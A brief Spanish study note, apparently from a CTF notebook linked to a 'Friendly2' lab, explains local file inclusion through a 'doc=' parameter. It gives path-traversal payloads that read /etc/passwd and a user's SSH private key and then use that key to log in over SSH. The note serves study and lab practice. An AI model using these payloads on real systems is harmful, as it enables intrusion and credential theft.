
El local file inclusion consiste en cuando hay una url del tipo **"check_if_exist.php?doc="** poner varios ../ y luego algún directorio como puede ser el /etc/passwd del estilo
`check_if_exist.php?doc=../../../../../../../../../../../etc/passwd`
Con esto puedes lograr ver algún usuario para luego meterte en un directorio home y en el usuario para sacar su id_rsa y posteriormente entrar por ssh
`check_if_exist.php?doc=../../../../../../../../../../../home/gh0st/.ssh/id_rsa`
Ver mas [[Friendly2 (Local File Inclusion, Path Hijacking)]]